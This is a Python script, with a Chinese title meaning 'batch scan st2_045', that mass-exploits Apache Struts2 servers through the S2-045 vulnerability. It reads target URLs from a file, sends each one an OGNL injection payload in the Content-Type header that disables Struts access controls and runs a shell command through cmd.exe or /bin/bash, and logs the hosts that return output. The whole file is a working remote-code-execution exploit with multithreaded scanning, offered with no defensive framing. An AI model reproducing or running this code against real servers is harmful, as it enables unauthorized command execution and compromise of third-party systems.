# 批量扫st2_045
import requests
import json
import threading
import time
import os

lock = threading.Lock()

def struts2_045(url):
    command = 'whoami'
    headers = {'Content-Type': 'multipart/form-data; boundary=f363ec3cc5ab44708db6a275b1f31a16',"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"}
    headers["Content-Type"] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=' \
                          "+command+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

    data = json.dumps({"image1":url})
    try:
        req = requests.post(url,data=data,headers=headers)
        return req.text
    except requests.ConnectionError as e:
        return '1'

def struts2_all(url):
    print(' >>>>> {0} --> struts2_045'.format(url))
    res = struts2_045(url)
    if 2 < len(res) < 50:
        save_045(url,res)
        print(' Success! whoami : {0}'.format(res[:-2]))
    else:
        print(' Filed! Not Exist st2!')

def open_url():
    urls = []
    line_num = 0
    url_path = r'C:\\action.txt'
    f = open(url_path,'r')
    f.readline()
    for each_line in f:
        urls.append(each_line)
        line_num += 1
    return urls,line_num

def save_045(url,res):
    path = os.getcwd()
    with open(r'{0}\\st2_045.txt'.format(path),'at') as f:
        f.writelines('[+]' + url + '          Exist st2_045! whoami : {0}\n'.format(res[:-2]))



def scan_Thread(thread_Num):
    threads = []
    for each_Thread in range(1,thread_Num+1):
        t = st2_thread(each_Thread)
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

class st2_thread(threading.Thread):
    def __init__(self,each_Thread):
        super(st2_thread,self).__init__()
        self.each_Thread = each_Thread

    def run(self):
        global lock,start_line,end_line,urls
        while start_line < end_line:
            if lock.acquire():
                if start_line < end_line:
                    print('thread:{0}：'.format(self.each_Thread),end='')
                    struts2_all(urls[start_line][:-1])
                    start_line += 1
                lock.release()


if __name__ == '__main__':
    urls,end_line = open_url()
    start_line = 0
    thread_Num = int(input('[threadNum]>>>'))
    scan_Thread(thread_Num)
